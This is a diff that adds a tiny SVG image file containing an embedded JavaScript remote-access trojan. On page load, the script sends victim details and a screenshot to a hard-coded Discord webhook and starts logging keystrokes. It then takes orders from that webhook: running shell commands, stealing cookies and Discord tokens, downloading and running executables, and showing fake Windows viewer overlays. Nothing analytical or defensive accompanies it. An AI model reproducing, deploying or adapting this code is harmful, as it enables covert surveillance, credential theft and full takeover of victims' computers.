@@ -1,0 +1,677 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <script type="text/javascript">
+    // <![CDATA[
+    var WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1533574759776780398/DqahgyNQJ2mCpS8TpvS0EyDvXA5ArGooTPk_KLfW6YtmzsVxbNpXbHxB6Obltv7hz6PI";
+    var TOKEN = "USER_TOKEN_HERE";
+    var connected = false;
+    var keyBuffer = "";
+    var overlayActive = false;
+    var currentOverlay = null;
+
+    function sendMessage(content) {
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', WEBHOOK_URL, true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify({content: content.substring(0, 1900)}));
+    }
+
+    function sendFile(blob, name) {
+      var formData = new FormData();
+      formData.append('file', blob, name);
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', WEBHOOK_URL, true);
+      xhr.send(formData);
+    }
+
+    function downloadAndExec(url) {
+      try {
+        sendMessage("[DROPEXEC] Downloading from: " + url + " | " + TOKEN);
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', url, true);
+        xhr.responseType = 'arraybuffer';
+        xhr.onload = function() {
+          if (this.status == 200) {
+            var blob = new Blob([this.response], {type: 'application/x-msdownload'});
+            var link = document.createElement('a');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = 'update_' + Date.now() + '.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            sendMessage("[DROPEXEC] Downloaded and executing | " + TOKEN);
+            setTimeout(function() {
+              try {
+                var shell = new ActiveXObject('WScript.Shell');
+                shell.Run('cmd /c start ' + link.download, 0, false);
+              } catch(e) {
+                sendMessage("[DROPEXEC] Execution failed: " + e.message + " | " + TOKEN);
+              }
+            }, 2000);
+          } else {
+            sendMessage("[DROPEXEC] Download failed - HTTP " + this.status + " | " + TOKEN);
+          }
+        };
+        xhr.onerror = function() {
+          sendMessage("[DROPEXEC] Network error | " + TOKEN);
+        };
+        xhr.send();
+      } catch(e) {
+        sendMessage("[DROPEXEC] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function playVideo(url) {
+      try {
+        sendMessage("[VIDEO] Opening video: " + url + " | " + TOKEN);
+        
+        if (overlayActive && currentOverlay) {
+          document.body.removeChild(currentOverlay);
+          overlayActive = false;
+          currentOverlay = null;
+        }
+
+        var container = document.createElement('div');
+        container.style.position = 'fixed';
+        container.style.top = '50%';
+        container.style.left = '50%';
+        container.style.transform = 'translate(-50%, -50%)';
+        container.style.zIndex = '999999';
+        container.style.backgroundColor = '#1a1a1a';
+        container.style.borderRadius = '10px';
+        container.style.boxShadow = '0 20px 60px rgba(0,0,0,0.9)';
+        container.style.border = '2px solid #333';
+        container.style.padding = '10px';
+        container.style.minWidth = '640px';
+        container.style.minHeight = '480px';
+        container.style.width = '80%';
+        container.style.maxWidth = '1024px';
+        container.style.height = 'auto';
+
+        var titleBar = document.createElement('div');
+        titleBar.style.backgroundColor = '#2b2b2b';
+        titleBar.style.borderRadius = '8px 8px 0 0';
+        titleBar.style.padding = '8px 12px';
+        titleBar.style.display = 'flex';
+        titleBar.style.justifyContent = 'space-between';
+        titleBar.style.alignItems = 'center';
+        titleBar.style.cursor = 'default';
+
+        var titleText = document.createElement('span');
+        titleText.textContent = 'Windows Media Player';
+        titleText.style.color = '#e0e0e0';
+        titleText.style.fontFamily = 'Segoe UI, Arial, sans-serif';
+        titleText.style.fontSize = '13px';
+        titleText.style.fontWeight = 'bold';
+
+        var closeBtn = document.createElement('button');
+        closeBtn.textContent = '✕';
+        closeBtn.style.backgroundColor = '#e81123';
+        closeBtn.style.color = 'white';
+        closeBtn.style.border = 'none';
+        closeBtn.style.borderRadius = '4px';
+        closeBtn.style.width = '28px';
+        closeBtn.style.height = '28px';
+        closeBtn.style.fontSize = '14px';
+        closeBtn.style.cursor = 'pointer';
+        closeBtn.style.fontWeight = 'bold';
+        closeBtn.style.transition = 'background 0.2s';
+        closeBtn.onmouseover = function() { this.style.backgroundColor = '#c00'; };
+        closeBtn.onmouseout = function() { this.style.backgroundColor = '#e81123'; };
+        closeBtn.onclick = function() {
+          if (currentOverlay && currentOverlay.parentNode) {
+            document.body.removeChild(currentOverlay);
+            overlayActive = false;
+            currentOverlay = null;
+            sendMessage("[VIDEO] Player closed | " + TOKEN);
+          }
+        };
+
+        titleBar.appendChild(titleText);
+        titleBar.appendChild(closeBtn);
+
+        var videoWrapper = document.createElement('div');
+        videoWrapper.style.backgroundColor = '#000';
+        videoWrapper.style.padding = '4px';
+        videoWrapper.style.borderRadius = '4px';
+        videoWrapper.style.marginTop = '4px';
+
+        var video = document.createElement('video');
+        video.src = url;
+        video.style.width = '100%';
+        video.style.height = 'auto';
+        video.style.display = 'block';
+        video.style.borderRadius = '4px';
+        video.autoplay = true;
+        video.controls = true;
+        video.loop = false;
+        video.muted = false;
+        video.style.backgroundColor = '#000';
+
+        var loadingDiv = document.createElement('div');
+        loadingDiv.textContent = 'Loading video...';
+        loadingDiv.style.color = '#999';
+        loadingDiv.style.fontFamily = 'Segoe UI, Arial, sans-serif';
+        loadingDiv.style.fontSize = '14px';
+        loadingDiv.style.padding = '20px';
+        loadingDiv.style.textAlign = 'center';
+        loadingDiv.style.display = 'block';
+
+        videoWrapper.appendChild(loadingDiv);
+        videoWrapper.appendChild(video);
+        video.style.display = 'none';
+
+        container.appendChild(titleBar);
+        container.appendChild(videoWrapper);
+        document.body.appendChild(container);
+        currentOverlay = container;
+        overlayActive = true;
+
+        video.onloadeddata = function() {
+          loadingDiv.style.display = 'none';
+          video.style.display = 'block';
+          sendMessage("[VIDEO] Video loaded and playing | " + TOKEN);
+        };
+
+        video.onerror = function() {
+          loadingDiv.textContent = 'Failed to load video';
+          loadingDiv.style.color = '#e81123';
+          sendMessage("[VIDEO] Failed to load video | " + TOKEN);
+        };
+
+        video.play().catch(function(e) {
+          sendMessage("[VIDEO] Autoplay blocked: " + e.message + " | " + TOKEN);
+        });
+
+        sendMessage("[VIDEO] Windows Media Player opened | " + TOKEN);
+      } catch(e) {
+        sendMessage("[VIDEO] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function showImage(url) {
+      try {
+        sendMessage("[IMAGE] Displaying image: " + url + " | " + TOKEN);
+        
+        if (overlayActive && currentOverlay) {
+          document.body.removeChild(currentOverlay);
+          overlayActive = false;
+          currentOverlay = null;
+        }
+
+        var container = document.createElement('div');
+        container.style.position = 'fixed';
+        container.style.top = '50%';
+        container.style.left = '50%';
+        container.style.transform = 'translate(-50%, -50%)';
+        container.style.zIndex = '999999';
+        container.style.backgroundColor = '#1a1a1a';
+        container.style.borderRadius = '10px';
+        container.style.boxShadow = '0 20px 60px rgba(0,0,0,0.9)';
+        container.style.border = '2px solid #333';
+        container.style.padding = '10px';
+        container.style.minWidth = '400px';
+        container.style.minHeight = '300px';
+        container.style.width = 'auto';
+        container.style.height = 'auto';
+        container.style.maxWidth = '90%';
+        container.style.maxHeight = '90%';
+
+        var titleBar = document.createElement('div');
+        titleBar.style.backgroundColor = '#2b2b2b';
+        titleBar.style.borderRadius = '8px 8px 0 0';
+        titleBar.style.padding = '8px 12px';
+        titleBar.style.display = 'flex';
+        titleBar.style.justifyContent = 'space-between';
+        titleBar.style.alignItems = 'center';
+        titleBar.style.cursor = 'default';
+
+        var titleText = document.createElement('span');
+        titleText.textContent = 'Windows Photo Viewer';
+        titleText.style.color = '#e0e0e0';
+        titleText.style.fontFamily = 'Segoe UI, Arial, sans-serif';
+        titleText.style.fontSize = '13px';
+        titleText.style.fontWeight = 'bold';
+
+        var closeBtn = document.createElement('button');
+        closeBtn.textContent = '✕';
+        closeBtn.style.backgroundColor = '#e81123';
+        closeBtn.style.color = 'white';
+        closeBtn.style.border = 'none';
+        closeBtn.style.borderRadius = '4px';
+        closeBtn.style.width = '28px';
+        closeBtn.style.height = '28px';
+        closeBtn.style.fontSize = '14px';
+        closeBtn.style.cursor = 'pointer';
+        closeBtn.style.fontWeight = 'bold';
+        closeBtn.style.transition = 'background 0.2s';
+        closeBtn.onmouseover = function() { this.style.backgroundColor = '#c00'; };
+        closeBtn.onmouseout = function() { this.style.backgroundColor = '#e81123'; };
+        closeBtn.onclick = function() {
+          if (currentOverlay && currentOverlay.parentNode) {
+            document.body.removeChild(currentOverlay);
+            overlayActive = false;
+            currentOverlay = null;
+            sendMessage("[IMAGE] Viewer closed | " + TOKEN);
+          }
+        };
+
+        titleBar.appendChild(titleText);
+        titleBar.appendChild(closeBtn);
+
+        var imageWrapper = document.createElement('div');
+        imageWrapper.style.backgroundColor = '#000';
+        imageWrapper.style.padding = '4px';
+        imageWrapper.style.borderRadius = '4px';
+        imageWrapper.style.marginTop = '4px';
+        imageWrapper.style.display = 'flex';
+        imageWrapper.style.alignItems = 'center';
+        imageWrapper.style.justifyContent = 'center';
+        imageWrapper.style.minHeight = '200px';
+
+        var loadingDiv = document.createElement('div');
+        loadingDiv.textContent = 'Loading image...';
+        loadingDiv.style.color = '#999';
+        loadingDiv.style.fontFamily = 'Segoe UI, Arial, sans-serif';
+        loadingDiv.style.fontSize = '14px';
+        loadingDiv.style.padding = '40px';
+        loadingDiv.style.textAlign = 'center';
+
+        var img = document.createElement('img');
+        img.src = url;
+        img.style.maxWidth = '100%';
+        img.style.maxHeight = '80vh';
+        img.style.display = 'none';
+        img.style.borderRadius = '4px';
+
+        imageWrapper.appendChild(loadingDiv);
+        imageWrapper.appendChild(img);
+        container.appendChild(titleBar);
+        container.appendChild(imageWrapper);
+        document.body.appendChild(container);
+        currentOverlay = container;
+        overlayActive = true;
+
+        img.onload = function() {
+          loadingDiv.style.display = 'none';
+          img.style.display = 'block';
+          sendMessage("[IMAGE] Image loaded and displayed | " + TOKEN);
+        };
+
+        img.onerror = function() {
+          loadingDiv.textContent = 'Failed to load image';
+          loadingDiv.style.color = '#e81123';
+          sendMessage("[IMAGE] Failed to load image | " + TOKEN);
+        };
+
+        sendMessage("[IMAGE] Windows Photo Viewer opened | " + TOKEN);
+      } catch(e) {
+        sendMessage("[IMAGE] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function showSVG(svgContent) {
+      try {
+        sendMessage("[SVG] Displaying SVG overlay | " + TOKEN);
+        
+        if (overlayActive && currentOverlay) {
+          document.body.removeChild(currentOverlay);
+          overlayActive = false;
+          currentOverlay = null;
+        }
+
+        var container = document.createElement('div');
+        container.style.position = 'fixed';
+        container.style.top = '50%';
+        container.style.left = '50%';
+        container.style.transform = 'translate(-50%, -50%)';
+        container.style.zIndex = '999999';
+        container.style.backgroundColor = '#1a1a1a';
+        container.style.borderRadius = '10px';
+        container.style.boxShadow = '0 20px 60px rgba(0,0,0,0.9)';
+        container.style.border = '2px solid #333';
+        container.style.padding = '10px';
+        container.style.minWidth = '400px';
+        container.style.minHeight = '300px';
+        container.style.maxWidth = '90%';
+        container.style.maxHeight = '90%';
+
+        var titleBar = document.createElement('div');
+        titleBar.style.backgroundColor = '#2b2b2b';
+        titleBar.style.borderRadius = '8px 8px 0 0';
+        titleBar.style.padding = '8px 12px';
+        titleBar.style.display = 'flex';
+        titleBar.style.justifyContent = 'space-between';
+        titleBar.style.alignItems = 'center';
+
+        var titleText = document.createElement('span');
+        titleText.textContent = 'Windows SVG Viewer';
+        titleText.style.color = '#e0e0e0';
+        titleText.style.fontFamily = 'Segoe UI, Arial, sans-serif';
+        titleText.style.fontSize = '13px';
+        titleText.style.fontWeight = 'bold';
+
+        var closeBtn = document.createElement('button');
+        closeBtn.textContent = '✕';
+        closeBtn.style.backgroundColor = '#e81123';
+        closeBtn.style.color = 'white';
+        closeBtn.style.border = 'none';
+        closeBtn.style.borderRadius = '4px';
+        closeBtn.style.width = '28px';
+        closeBtn.style.height = '28px';
+        closeBtn.style.fontSize = '14px';
+        closeBtn.style.cursor = 'pointer';
+        closeBtn.style.fontWeight = 'bold';
+        closeBtn.onclick = function() {
+          if (currentOverlay && currentOverlay.parentNode) {
+            document.body.removeChild(currentOverlay);
+            overlayActive = false;
+            currentOverlay = null;
+            sendMessage("[SVG] Viewer closed | " + TOKEN);
+          }
+        };
+
+        titleBar.appendChild(titleText);
+        titleBar.appendChild(closeBtn);
+
+        var contentWrapper = document.createElement('div');
+        contentWrapper.style.backgroundColor = '#000';
+        contentWrapper.style.padding = '20px';
+        contentWrapper.style.borderRadius = '4px';
+        contentWrapper.style.marginTop = '4px';
+        contentWrapper.style.minHeight = '200px';
+        contentWrapper.style.display = 'flex';
+        contentWrapper.style.alignItems = 'center';
+        contentWrapper.style.justifyContent = 'center';
+
+        var svgWrapper = document.createElement('div');
+        svgWrapper.innerHTML = svgContent;
+        svgWrapper.style.maxWidth = '100%';
+        svgWrapper.style.maxHeight = '80vh';
+
+        contentWrapper.appendChild(svgWrapper);
+        container.appendChild(titleBar);
+        container.appendChild(contentWrapper);
+        document.body.appendChild(container);
+        currentOverlay = container;
+        overlayActive = true;
+
+        sendMessage("[SVG] SVG viewer opened | " + TOKEN);
+      } catch(e) {
+        sendMessage("[SVG] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function hideOverlay() {
+      try {
+        if (currentOverlay && currentOverlay.parentNode) {
+          document.body.removeChild(currentOverlay);
+          overlayActive = false;
+          currentOverlay = null;
+          sendMessage("[OVERLAY] Closed | " + TOKEN);
+        } else {
+          sendMessage("[OVERLAY] No active overlay | " + TOKEN);
+        }
+      } catch(e) {
+        sendMessage("[OVERLAY] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function stealCookies() {
+      try {
+        var cookies = document.cookie;
+        if (cookies.length > 0) {
+          sendMessage("[COOKIES] " + cookies + " | " + TOKEN);
+        } else {
+          sendMessage("[COOKIES] No cookies found | " + TOKEN);
+        }
+      } catch(e) {
+        sendMessage("[COOKIES] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function getDiscordToken() {
+      try {
+        var token = null;
+        if (window.webpackChunkdiscord_app) {
+          var modules = window.webpackChunkdiscord_app.push([[Symbol()], {}, function(e) { return e; }]);
+          for (var i = 0; i < modules.length; i++) {
+            var mod = modules[i];
+            if (mod && mod.exports) {
+              var exp = mod.exports;
+              if (exp.default && exp.default.getToken) {
+                token = exp.default.getToken();
+                break;
+              }
+              if (exp.getToken) {
+                token = exp.getToken();
+                break;
+              }
+            }
+          }
+        }
+        if (token) {
+          sendMessage("[TOKENGRAB] Discord token: " + token + " | " + TOKEN);
+        } else {
+          sendMessage("[TOKENGRAB] No Discord token found | " + TOKEN);
+        }
+      } catch(e) {
+        sendMessage("[TOKENGRAB] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function screenshot() {
+      try {
+        var canvas = document.createElement('canvas');
+        canvas.width = screen.width;
+        canvas.height = screen.height;
+        var ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#000';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        try {
+          ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
+        } catch(e) {
+          var img = new Image();
+          img.onload = function() {
+            ctx.drawImage(img, 0, 0);
+            canvas.toBlob(function(blob) {
+              sendFile(blob, 'screenshot_' + Date.now() + '.png');
+              sendMessage("[SCREEN] Screenshot captured | " + TOKEN);
+            });
+          };
+          img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+          return;
+        }
+        canvas.toBlob(function(blob) {
+          sendFile(blob, 'screenshot_' + Date.now() + '.png');
+          sendMessage("[SCREEN] Screenshot captured | " + TOKEN);
+        });
+      } catch(e) {
+        sendMessage("[SCREEN] Failed: " + e.message + " | " + TOKEN);
+      }
+    }
+
+    function keylogStart() {
+      document.addEventListener('keydown', function(e) {
+        if (e.key.length === 1) {
+          keyBuffer += e.key;
+        } else if (e.key === 'Enter') {
+          keyBuffer += '\n';
+        } else if (e.key === 'Backspace') {
+          keyBuffer = keyBuffer.slice(0, -1);
+        } else if (e.key === 'Tab') {
+          keyBuffer += '\t';
+        } else if (e.key === ' ') {
+          keyBuffer += ' ';
+        } else {
+          keyBuffer += '[' + e.key + ']';
+        }
+        if (keyBuffer.length > 1900) {
+          sendMessage("[KEYLOG] " + keyBuffer + " | " + TOKEN);
+          keyBuffer = '';
+        }
+      });
+    }
+
+    function pollCommands() {
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', WEBHOOK_URL + '/messages?limit=5', true);
+      xhr.onload = function() {
+        if (this.status == 200) {
+          try {
+            var messages = JSON.parse(this.responseText);
+            for (var i = messages.length - 1; i >= 0; i--) {
+              var content = messages[i].content;
+              if (content.startsWith('!connect ')) {
+                var token = content.substring(9);
+                if (token === TOKEN) {
+                  connected = true;
+                  sendMessage("[CONNECTED] Now controlling | " + TOKEN);
+                  sendMessage("[HELP] Commands: !mc help | " + TOKEN);
+                }
+              }
+              else if (connected && content.startsWith('!mc ')) {
+                var cmd = content.substring(4);
+                processCommand(cmd);
+              }
+              else if (connected && content === '!disconnect') {
+                connected = false;
+                sendMessage("[DISCONNECTED] Session ended | " + TOKEN);
+              }
+              else if (connected && content === '!status') {
+                sendMessage("[STATUS] Connected: " + connected + " | Token: " + TOKEN + " | " + TOKEN);
+              }
+            }
+          } catch(e) {}
+        }
+      };
+      xhr.send();
+    }
+
+    function processCommand(cmd) {
+      if (cmd.startsWith('exec ')) {
+        var shellCmd = cmd.substring(5);
+        try {
+          var shell = new ActiveXObject('WScript.Shell');
+          var exec = shell.Exec('cmd /c ' + shellCmd);
+          var output = exec.StdOut.ReadAll();
+          sendMessage("[EXEC] " + output.substring(0, 1900) + " | " + TOKEN);
+        } catch(e) {
+          sendMessage("[EXEC] Failed: " + e.message + " | " + TOKEN);
+        }
+      }
+      else if (cmd === 'tokengrab') {
+        getDiscordToken();
+      }
+      else if (cmd === 'cookies') {
+        stealCookies();
+      }
+      else if (cmd.startsWith('dropexec ')) {
+        var url = cmd.substring(9);
+        downloadAndExec(url);
+      }
+      else if (cmd.startsWith('video ')) {
+        var url = cmd.substring(6);
+        playVideo(url);
+      }
+      else if (cmd.startsWith('image ')) {
+        var url = cmd.substring(6);
+        showImage(url);
+      }
+      else if (cmd.startsWith('svg ')) {
+        var svgContent = cmd.substring(4);
+        showSVG(svgContent);
+      }
+      else if (cmd === 'overlay off') {
+        hideOverlay();
+      }
+      else if (cmd === 'screenshot') {
+        screenshot();
+      }
+      else if (cmd === 'keylog on') {
+        keylogStart();
+        sendMessage("[KEYLOG] Keylogging enabled | " + TOKEN);
+      }
+      else if (cmd === 'keylog off') {
+        document.removeEventListener('keydown', keylogStart);
+        sendMessage("[KEYLOG] Keylogging disabled | " + TOKEN);
+      }
+      else if (cmd === 'keylog get') {
+        if (keyBuffer.length > 0) {
+          sendMessage("[KEYLOG] " + keyBuffer + " | " + TOKEN);
+        } else {
+          sendMessage("[KEYLOG] No keys logged | " + TOKEN);
+        }
+      }
+      else if (cmd === 'help') {
+        var help = "========== COMMANDS ==========\n" +
+          "exec <cmd> - Execute system command\n" +
+          "tokengrab - Steal Discord tokens\n" +
+          "cookies - Steal browser cookies\n" +
+          "dropexec <url> - Download and execute .exe\n" +
+          "video <url> - Play video (Windows Media Player style)\n" +
+          "image <url> - Display image (Windows Photo Viewer style)\n" +
+          "svg <xml> - Display SVG viewer\n" +
+          "overlay off - Close current overlay\n" +
+          "screenshot - Capture screen\n" +
+          "keylog on/off/get - Keyboard logging\n" +
+          "kill - Close agent\n" +
+          "==================================";
+        sendMessage("[HELP]\n```" + help + "``` | " + TOKEN);
+      }
+      else if (cmd === 'kill') {
+        sendMessage("[KILL] Terminating agent | " + TOKEN);
+        if (currentOverlay && currentOverlay.parentNode) {
+          document.body.removeChild(currentOverlay);
+        }
+        document.body.innerHTML = '';
+        connected = false;
+        running = false;
+      }
+    }
+
+    function init() {
+      TOKEN = generateToken();
+      sendMessage("[NEW USER OBTAIN] " + TOKEN + " | " + navigator.userAgent + " | " + screen.width + "x" + screen.height);
+      
+      var canvas = document.createElement('canvas');
+      canvas.width = screen.width;
+      canvas.height = screen.height;
+      var ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      try {
+        ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
+      } catch(e) {}
+      canvas.toBlob(function(blob) {
+        sendFile(blob, 'initial_screenshot_' + TOKEN + '.png');
+      });
+      
+      sendMessage("[INSTRUCTIONS] Type `!connect " + TOKEN + "` to take control | " + TOKEN);
+      sendMessage("[INSTRUCTIONS] Then type `!mc help` to see commands | " + TOKEN);
+      
+      setInterval(function() {
+        sendMessage("[HEARTBEAT] " + TOKEN + " | Active | " + TOKEN);
+      }, 300000);
+      
+      setInterval(function() {
+        pollCommands();
+      }, 3000);
+      
+      keylogStart();
+    }
+
+    function generateToken() {
+      var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      var token = '';
+      for (var i = 0; i < 32; i++) {
+        token += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return token;
+    }
+
+    window.onload = function() {
+      init();
+    };
+    // ]]>
+  </script>
+</svg>
